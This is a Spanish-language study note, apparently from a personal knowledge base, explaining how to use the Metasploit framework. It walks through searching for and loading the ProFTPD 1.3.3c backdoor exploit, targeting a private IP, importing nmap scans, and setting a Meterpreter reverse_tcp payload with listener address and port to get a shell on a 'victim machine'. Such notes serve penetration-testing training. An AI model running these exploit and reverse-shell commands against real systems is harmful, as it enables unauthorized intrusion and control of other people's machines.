Metasploit framework es una herramienta desarrollada en Perl y Ruby en su mayor parte, que está **enfocada a auditores de seguridad y equipos Red Team y Blue Team**.

**Es una herramienta muy completa que tiene muchísimos exploits**, que son vulnerabilidades conocidas, en las cuales tienen también unos módulos, llamados [[Payload]], que son los códigos que explotan estas vulnerabilidades.

También **dispone de otros tipo de módulos**, por ejemplo, los encoders, que son una especie de códigos de cifrado para evasión de antivirus o sistemas de seguridad perimetral.

## Uso
	msfdb run
Esto crear la base de datos y el usuario, es decir inicializa la herramiente, *esto solo se ejecuta cuando no hemos hecho uso de esta.*

	msfconsole
Ejecuta el framework de mestasploit

	searchsploit ProFTP 1.3.3.c
Lo que hace es buscar meta sploit que sean vulnerables para la version del servicio.

-ProFTP 1.3.3.c *es la version del servicio donde queremos buscar vulnerabilidades*

	use xploit/unix/ftp/proftpd_133c_backdoor
Usa el metasploit que se esta en la siguiente ruta

	show options
Muetra los datos que debemos de introducir en el sploit que queremos utilizar

	set RHOSTS 192.168.1.68
Esto sirve para setear valores que el splot nos pide

-RHOSTS *Es el nombre del parametro que es requerido por el sploit*
-192.168.1.68 *Es el valor el valor que le damos al parametro RHOSTS*

**Parametros**
-x *Muestra el archivo*

## nmap
Ahora podemos realizar escaneos dentro de metaploit con la finalidad de facilitar el uso entre metasploit, ya que podemos vizualizar todo la informacion del escaneo.

Tambien podemo tomar una db que contenga todos los datos de un scan e importarlo a metasploit.

	nmap -sP 192.168.1.0/24 -oX scan-result.xml

-oX *Guarda el resultado en un archivo xml*

	db_import scan-result.xml
Este es el formato adecuado para importar la informacion a metasploit.

	hosts
Vizualizar los escaneos 

	services
Visualizar los servicios que corren en un determinado escaneo


## Creacion de listener
Ahora cuando un exploit nos permite la execucion remota de comando, la mayoria de las veces nos enviamos una shell por tcp a nuestra maquina de forma manual con *netcat* pero esto se puede hacer desde metasploit.

Una vez que ya configuramos las opciones del exploit procederemos a cargar un [[Payload]] que defina una ruta en escucha para recibir la shell desde la maquina victima.

	set payload windows/meterpreter/reverse_tcp

Ahora por lo tanto hay que establecer las opciones para el payload, en este caso la ip y puerto que estara en escucha.

	set LHOST 192.168.1.73
	set LPORT 443

En caso de ser exitoso la explotacion podremos vizualizar algo asi como, y ya estariamos dentro de la maquina victima ,para obtener una consola interactiva solo faltaria el comando SHELL.

	[!] Meterpreter session 1 openend
	meterpreter> shell


